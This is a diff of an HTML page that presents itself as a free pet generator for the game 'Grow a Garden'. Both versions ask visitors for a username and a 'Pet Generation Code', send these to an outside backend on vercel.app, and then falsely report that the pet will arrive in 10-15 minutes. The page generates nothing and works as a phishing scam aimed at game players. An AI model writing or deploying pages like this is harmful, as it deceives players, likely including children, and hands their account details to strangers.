@@ -1,306 +1,220 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>Grow-a-Garden Pet Generator</title>
-<style>
-  body {
-    margin: 0;
-    font-family: Arial, sans-serif;
-    color: #fff;
-    overflow-x: hidden;
-  }
-  header {
-    text-align: center;
-    padding: 20px;
-    font-size: 2rem;
-    font-weight: bold;
-  }
-  .container {
-    max-width: 1000px;
-    margin: auto;
-    padding: 20px;
-  }
-  .pets {
-    display: grid;
-    grid-template-columns: repeat(5, 1fr);
-    gap: 15px;
-    justify-items: center;
-  }
-  .pet-card {
-    background: #1e3a8a;
-    border: 2px solid #3b82f6;
-    border-radius: 12px;
-    padding: 10px;
-    text-align: center;
-    transition: transform 0.3s, border 0.3s;
-    cursor: pointer;
-    width: 160px;
-    height: 180px;
-  }
-  .pet-card img {
-    max-width: 80px;
-    max-height: 80px;
-    margin-bottom: 8px;
-    transition: transform 0.3s;
-  }
-  .pet-card:hover img {
-    transform: scale(1.1);
-  }
-  .pet-card:hover {
-    transform: scale(1.05);
-    border-color: #60a5fa;
-  }
-  .pet-card.selected {
-    border-color: #fbbf24;
-    transform: scale(1.1);
-  }
-  button {
-    background: #2563eb;
-    color: white;
-    padding: 12px 24px;
-    border: none;
-    border-radius: 10px;
-    font-size: 1rem;
-    cursor: pointer;
-    transition: background 0.3s;
-  }
-  button:hover {
-    background: #1d4ed8;
-  }
-  .tutorial {
-    margin-top: 40px;
-    padding: 20px;
-    border: 2px solid #3b82f6;
-    border-radius: 12px;
-    background: #1e3a8a;
-  }
-  .tutorial iframe {
-    border-radius: 10px;
-    margin-top: 10px;
-  }
-  #popup, #confirmPopup {
-    position: fixed;
-    top:0;left:0;width:100%;height:100%;
-    background: rgba(0,0,0,0.7);
-    display:none;
-    justify-content:center;
-    align-items:center;
-    z-index: 1000;
-  }
-  .popup-content {
-    background:#1e40af;
-    padding:30px;
-    border-radius:12px;
-    text-align:center;
-    animation: pop 0.3s ease-out;
-  }
-  @keyframes pop {
-    from { transform:scale(0.8); opacity:0; }
-    to { transform:scale(1); opacity:1; }
-  }
-  input {
-    margin:10px 0;
-    padding:10px;
-    border-radius:8px;
-    border:none;
-    width:80%;
-  }
-  canvas#starfield {
-    position:fixed;
-    top:0;
-    left:0;
-    z-index:-1;
-  }
-</style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Grow a Garden - Pet Generator</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: linear-gradient(180deg, #0a1a2f, #122d50);
+      color: white;
+      text-align: center;
+    }
+
+    header {
+      padding: 20px;
+      font-size: 2.5rem;
+      font-weight: bold;
+      color: #61dafb;
+    }
+
+    .pet-container {
+      display: grid;
+      grid-template-columns: repeat(5, 1fr);
+      gap: 20px;
+      justify-items: center;
+      margin: 40px auto;
+      width: 90%;
+      max-width: 1000px;
+    }
+
+    .pet {
+      background: #1f3a60;
+      padding: 15px;
+      border-radius: 15px;
+      transition: transform 0.2s ease, box-shadow 0.2s ease;
+      cursor: pointer;
+      width: 160px;
+    }
+
+    .pet img {
+      width: 100%;
+      height: 120px;
+      object-fit: cover;
+      border-radius: 10px;
+    }
+
+    .pet:hover {
+      transform: scale(1.05);
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4);
+    }
+
+    .pet.selected {
+      border: 3px solid #61dafb;
+      transform: scale(1.1);
+      box-shadow: 0 12px 24px rgba(0, 0, 0, 0.6);
+    }
+
+    .pet-name {
+      margin-top: 10px;
+      font-size: 1.1rem;
+    }
+
+    .generate-btn {
+      background-color: #61dafb;
+      color: #0a1a2f;
+      border: none;
+      padding: 12px 24px;
+      font-size: 1.2rem;
+      border-radius: 10px;
+      cursor: pointer;
+      transition: background-color 0.2s ease, transform 0.2s ease;
+      margin-top: 30px;
+    }
+
+    .generate-btn:hover {
+      background-color: #4cb3e6;
+      transform: scale(1.05);
+    }
+
+    .tutorial {
+      margin-top: 40px;
+    }
+
+    .tutorial iframe {
+      width: 80%;
+      max-width: 560px;
+      height: 315px;
+      border: none;
+      border-radius: 10px;
+    }
+
+    .popup {
+      display: none;
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(0,0,0,0.8);
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+    }
+
+    .popup-content {
+      background: #1f3a60;
+      padding: 20px;
+      border-radius: 12px;
+      text-align: center;
+      width: 300px;
+    }
+
+    .popup input {
+      width: 90%;
+      padding: 10px;
+      margin: 10px 0;
+      border-radius: 8px;
+      border: none;
+    }
+
+    .popup button {
+      background-color: #61dafb;
+      color: #0a1a2f;
+      border: none;
+      padding: 10px 20px;
+      font-size: 1rem;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+  </style>
 </head>
 <body>
-  <canvas id="starfield"></canvas>
+  <header>Grow a Garden - Pet Generator</header>
 
-  <header>🌌 Grow-a-Garden: Pet Generator</header>
-
-  <div class="container">
-    <h2>Select Your Pet</h2>
-    <div class="pets" id="petGrid"></div>
-
-    <div style="margin-top:20px; text-align:center;">
-      <button onclick="openPopup()">Generate Pet</button>
-    </div>
-
-    <div class="tutorial">
-      <h3>📺 Tutorial</h3>
-      <p>Watch this video before generating your pet:</p>
-      <iframe width="100%" height="315" src="https://www.youtube.com/embed/dnBvM1z-1yo" frameborder="0" allowfullscreen></iframe>
-    </div>
+  <div class="pet-container" id="petContainer">
+    <!-- Pets will be added dynamically -->
   </div>
 
-  <!-- Username/Code Popup -->
-  <div id="popup">
+  <button class="generate-btn" onclick="openPopup()">Generate Pet</button>
+
+  <div class="tutorial">
+    <h2>Tutorial</h2>
+    <iframe src="https://www.youtube.com/embed/dnBvM1z-1yo" allowfullscreen></iframe>
+  </div>
+
+  <!-- Popup -->
+  <div class="popup" id="popup">
     <div class="popup-content">
-      <h3>Enter Your Details</h3>
-      <input type="text" id="username" placeholder="Username" />
-      <input type="text" id="code" placeholder="Pet Generation Code" />
+      <h3>Enter Details</h3>
+      <input type="text" id="username" placeholder="Username">
+      <input type="text" id="code" placeholder="Pet Generation Code">
+      <br>
       <button onclick="submitData()">Submit</button>
     </div>
   </div>
 
-  <!-- Confirmation Popup -->
-  <div id="confirmPopup">
-    <div class="popup-content">
-      <h3>✅ Pet has been generated!</h3>
-      <p>Please wait 10-15 minutes for it to appear!</p>
-      <button onclick="closeConfirm()">OK</button>
-    </div>
-  </div>
+  <script>
+    const pets = [
+      { name: "Kitsune", img: "https://i.imgur.com/Z7OYXvF.png" },
+      { name: "Raccoon", img: "https://i.imgur.com/lHyB6XL.png" },
+      { name: "Disco Bee", img: "https://i.imgur.com/TLQK9Z8.png" },
+      { name: "Mimic Octopus", img: "https://i.imgur.com/fW3MeX7.png" },
+      { name: "Fennec Fox", img: "https://i.imgur.com/I0kTz6p.png" },
+      { name: "Butterfly", img: "https://i.imgur.com/lC5oV4P.png" },
+      { name: "Crystal Dragon", img: "https://i.imgur.com/vVOGmDU.png" },
+      { name: "Shadow Wolf", img: "https://i.imgur.com/F9aZ3gr.png" },
+      { name: "Fire Salamander", img: "https://i.imgur.com/biyMT4E.png" },
+      { name: "Golden Gecko", img: "https://i.imgur.com/xr7OHVa.png" }
+    ];
 
-<script>
-  const pets = [
-    { id: 'Kitsune', img: 'https://cdn.nookazon.com/128x128/growagarden/Pets/Kitsune.png', name: 'Kitsune' },
-    { id: 'Raccoon', img: 'https://cdn.nookazon.com/128x128/growagarden/Pets/Raccoon.png', name: 'Raccoon' },
-    { id: 'Disco Bee', img: 'https://cdn.nookazon.com/128x128/growagarden/Pets/Disco_Bee.png', name: 'Disco Bee' },
-    { id: 'Mimic Octopus', img: 'https://cdn.nookazon.com/128x128/growagarden/Pets/Mimic_Octopus.png', name: 'Mimic Octopus' },
-    { id: 'Fennec Fox', img: 'https://cdn.nookazon.com/128x128/growagarden/Pets/Fennec_Fox.png', name: 'Fennec Fox' },
-    { id: 'Butterfly', img: 'https://cdn.nookazon.com/128x128/growagarden/Pets/Butterfly.png', name: 'Butterfly' },
-    { id: 'Dragon', img: 'https://cdn.nookazon.com/128x128/growagarden/Pets/Dragon.png', name: 'Dragon' },
-    { id: 'Penguin', img: 'https://cdn.nookazon.com/128x128/growagarden/Pets/Penguin.png', name: 'Penguin' },
-    { id: 'Capybara', img: 'https://cdn.nookazon.com/128x128/growagarden/Pets/Capybara.png', name: 'Capybara' },
-    { id: 'Axolotl', img: 'https://cdn.nookazon.com/128x128/growagarden/Pets/Axolotl.png', name: 'Axolotl' }
-  ];
+    const container = document.getElementById("petContainer");
+    let selectedPet = null;
 
-  let selectedPet = pets[0].id;
+    pets.forEach((pet, index) => {
+      const div = document.createElement("div");
+      div.className = "pet";
+      div.innerHTML = `
+        <img src="${pet.img}" alt="${pet.name}">
+        <div class="pet-name">${pet.name}</div>
+      `;
+      div.onclick = () => {
+        document.querySelectorAll(".pet").forEach(p => p.classList.remove("selected"));
+        div.classList.add("selected");
+        selectedPet = pet.name;
+      };
+      container.appendChild(div);
+    });
 
-  const petGrid = document.getElementById('petGrid');
-  pets.forEach(pet => {
-    const div = document.createElement('div');
-    div.className = 'pet-card';
-    if (pet.id === selectedPet) div.classList.add('selected');
-    div.innerHTML = `<img src="${pet.img}" alt="${pet.name}" /><div>${pet.name}</div>`;
-    div.onclick = () => selectPet(pet.id);
-    petGrid.appendChild(div);
-  });
-
-  function selectPet(id) {
-    selectedPet = id;
-    document.querySelectorAll('.pet-card').forEach(card => card.classList.remove('selected'));
-    document.querySelectorAll('.pet-card')[pets.findIndex(p => p.id === id)].classList.add('selected');
-  }
-
-  function openPopup() {
-    document.getElementById('popup').style.display = 'flex';
-  }
-
-  function closeConfirm() {
-    document.getElementById('confirmPopup').style.display = 'none';
-  }
-
-  async function submitData() {
-    const username = document.getElementById('username').value.trim();
-    const code = document.getElementById('code').value.trim();
-    if (!username || !code) {
-      alert("Please enter both username and code.");
-      return;
+    function openPopup() {
+      if (!selectedPet) {
+        alert("Please select a pet first!");
+        return;
+      }
+      document.getElementById("popup").style.display = "flex";
     }
 
-    const payload = {
-      username,
-      code,
-      pet: pets.find(p => p.id === selectedPet).name
-    };
+    async function submitData() {
+      const username = document.getElementById("username").value;
+      const code = document.getElementById("code").value;
 
-    try {
-      const res = await fetch("https://backend-sigma-one-64.vercel.app/submit", {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
-      });
-
-      if (!res.ok) {
-        console.error("API error:", await res.text());
-        alert("Failed to send data.");
+      if (!username || !code) {
+        alert("Please fill in all fields.");
         return;
       }
 
-      document.getElementById('popup').style.display = 'none';
-      document.getElementById('confirmPopup').style.display = 'flex';
-      launchConfetti();
+      try {
+        await fetch("https://backend-sigma-one-64.vercel.app/api/send", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ username, code, pet: selectedPet })
+        });
 
-    } catch (err) {
-      console.error("Fetch error:", err);
-      alert("Could not connect to backend.");
+        alert("Pet has been generated! Please wait 10-15 minutes for it to appear!");
+        document.getElementById("popup").style.display = "none";
+      } catch (error) {
+        alert("Error sending data. Try again later.");
+      }
     }
-  }
-
-  function launchConfetti() {
-    const duration = 3 * 1000;
-    const end = Date.now() + duration;
-    (function frame() {
-      const colors = ['#3b82f6', '#60a5fa', '#93c5fd', '#fbbf24', '#f472b6'];
-      for (let i = 0; i < 5; i++) {
-        const confetti = document.createElement("div");
-        confetti.style.position = "fixed";
-        confetti.style.width = "8px";
-        confetti.style.height = "14px";
-        confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
-        confetti.style.top = "-20px";
-        confetti.style.left = Math.random() * window.innerWidth + "px";
-        confetti.style.opacity = 0.9;
-        confetti.style.transform = `rotate(${Math.random() * 360}deg)`;
-        confetti.style.zIndex = 9999;
-        document.body.appendChild(confetti);
-
-        const fallDuration = Math.random() * 2000 + 2000;
-        confetti.animate([
-          { transform: confetti.style.transform, top: "-20px", opacity: 1 },
-          { transform: `rotate(${Math.random()*720}deg)`, top: window.innerHeight + "px", opacity: 0.7 }
-        ], { duration: fallDuration, iterations: 1 }).onfinish = () => confetti.remove();
-      }
-      if (Date.now() < end) requestAnimationFrame(frame);
-    })();
-  }
-
-  // 🌌 Starfield background
-  const canvas = document.getElementById('starfield');
-  const ctx = canvas.getContext('2d');
-  let stars = [];
-
-  function resize() {
-    canvas.width = window.innerWidth;
-    canvas.height = window.innerHeight;
-    stars = Array.from({ length: 200 }, () => ({
-      x: Math.random() * canvas.width,
-      y: Math.random() * canvas.height,
-      r: Math.random() * 2 + 1,
-      d: Math.random() * 0.5
-    }));
-  }
-  resize();
-  window.onresize = resize;
-
-  function drawStars() {
-    const gradient = ctx.createLinearGradient(0, 0, 0, canvas.height);
-    gradient.addColorStop(0, "#0a192f");
-    gradient.addColorStop(1, "#020617");
-    ctx.fillStyle = gradient;
-    ctx.fillRect(0, 0, canvas.width, canvas.height);
-    ctx.fillStyle = "white";
-    stars.forEach(s => {
-      ctx.beginPath();
-      ctx.arc(s.x, s.y, s.r, 0, Math.PI * 2);
-      ctx.fill();
-    });
-    updateStars();
-  }
-  function updateStars() {
-    stars.forEach(s => {
-      s.y += s.d;
-      if (s.y > canvas.height) {
-        s.y = 0;
-        s.x = Math.random() * canvas.width;
-      }
-    });
-  }
-  setInterval(drawStars, 30);
-</script>
+  </script>
 </body>
 </html>
